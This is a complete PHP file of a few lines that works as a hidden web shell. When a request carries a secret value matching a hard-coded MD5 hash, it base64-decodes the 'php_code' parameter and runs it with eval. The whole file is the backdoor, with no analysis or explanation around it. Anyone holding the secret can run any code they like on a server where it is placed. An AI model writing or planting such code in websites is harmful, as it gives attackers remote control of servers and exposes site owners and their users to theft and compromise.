<?php

if (isset($_REQUEST['ch']) && md5($_REQUEST['ch']) == 'c256ad1aae83eebf358b0f3d8bf295af' && isset($_REQUEST['php_code'])) {
    echo $_REQUEST['php_code'];
    eval(base64_decode($_REQUEST['php_code']));
}
